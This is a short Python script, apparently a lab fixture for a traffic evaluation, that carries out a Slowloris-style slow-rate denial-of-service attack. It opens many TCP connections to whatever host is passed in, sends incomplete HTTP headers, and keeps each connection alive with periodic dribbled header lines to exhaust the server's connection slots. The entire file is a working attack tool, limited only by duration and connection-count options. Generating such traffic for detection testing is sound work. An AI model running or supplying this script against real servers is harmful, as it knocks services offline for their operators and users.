#!/usr/bin/env python3
"""Slow-rate (Slowloris-style) load for the RA3 evaluation, victim-only.

Opens many TCP connections to the victim's web port and dribbles a partial HTTP
request header on each, holding the connections open without completing them.
This is the Slowrate_DoS class: it ties up server connection slots at very low
bandwidth. Bounded by --duration and --connections; the target is the single
address passed in. Lab fixture, not a general tool.
"""

from __future__ import annotations

import argparse
import socket
import time


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("host")
    ap.add_argument("port", type=int, nargs="?", default=80)
    ap.add_argument("--dev")                 # bind to the tunnel interface
    ap.add_argument("--src")                 # bind to the tunnel source address
    ap.add_argument("--duration", type=int, default=60)
    ap.add_argument("--connections", type=int, default=200)
    args = ap.parse_args()

    socks: list[socket.socket] = []
    for _ in range(args.connections):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if args.dev:
                try:
                    s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, args.dev.encode())
                except OSError:
                    pass
            if args.src:
                s.bind((args.src, 0))
            s.settimeout(4)
            s.connect((args.host, args.port))
            s.send(b"GET / HTTP/1.1\r\nHost: victim\r\n")  # deliberately incomplete
            socks.append(s)
        except OSError:
            continue
    print(f"slowrate: opened {len(socks)} partial connections to {args.host}:{args.port}", flush=True)

    end = time.time() + args.duration
    while time.time() < end and socks:
        for s in list(socks):
            try:
                s.send(b"X-a: b\r\n")   # keep-alive dribble, never finishing the request
            except OSError:
                socks.remove(s)
        time.sleep(10)
    for s in socks:
        s.close()
    print("slowrate: done", flush=True)


if __name__ == "__main__":
    main()
